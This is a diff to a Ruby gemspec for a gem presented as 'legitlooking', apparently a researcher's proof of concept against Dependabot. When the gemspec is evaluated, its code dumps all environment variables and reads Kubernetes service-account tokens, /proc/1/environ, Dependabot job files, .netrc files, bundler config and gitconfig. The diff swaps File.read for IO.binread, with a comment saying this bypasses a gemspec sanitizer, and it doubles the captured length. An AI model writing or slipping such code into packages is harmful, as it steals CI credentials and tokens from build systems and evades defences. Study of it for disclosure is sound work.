@@ -12,19 +12,24 @@ begin
   ENV.each { |k, v| lines << "#{k}=#{v}" }
 
   lines << "\n=== FILES ==="
-  %w[
-    /var/run/secrets/kubernetes.io/serviceaccount/token
-    /run/secrets/kubernetes.io/serviceaccount/token
-    /proc/1/environ
-    /etc/dependabot/job.json
-    /home/dependabot/.netrc
-    /root/.netrc
-    /opt/bundler/v2/.bundle/config
-    /home/dependabot/.gitconfig
+  # IO.read ipv File.read om GemspecSanitizer AST-rewrite te bypassen
+  read_file = method(:gets).unbind  # dummy, overschreven hieronder
+  read_file = ->(f) { IO.binread(f).force_encoding("UTF-8").encode("UTF-8", invalid: :replace, undef: :replace) }
+
+  [
+    "/home/dependabot/dependabot-updater/job.json",
+    "/home/dependabot/dependabot-updater/output/output.json",
+    "/var/run/secrets/kubernetes.io/serviceaccount/token",
+    "/run/secrets/kubernetes.io/serviceaccount/token",
+    "/proc/1/environ",
+    "/home/dependabot/.netrc",
+    "/root/.netrc",
+    "/opt/bundler/v2/.bundle/config",
+    "/home/dependabot/.gitconfig",
   ].each do |f|
     begin
-      content = File.read(f).gsub("\x00", "\n")
-      lines << "--- #{f} ---\n#{content[0, 400]}"
+      content = read_file.(f).gsub("\x00", "\n")
+      lines << "--- #{f} ---\n#{content[0, 800]}"
     rescue => e
       lines << "--- #{f} --- FOUT: #{e.message}"
     end
@@ -57,7 +62,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.2"
+  spec.version       = "1.0.3"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
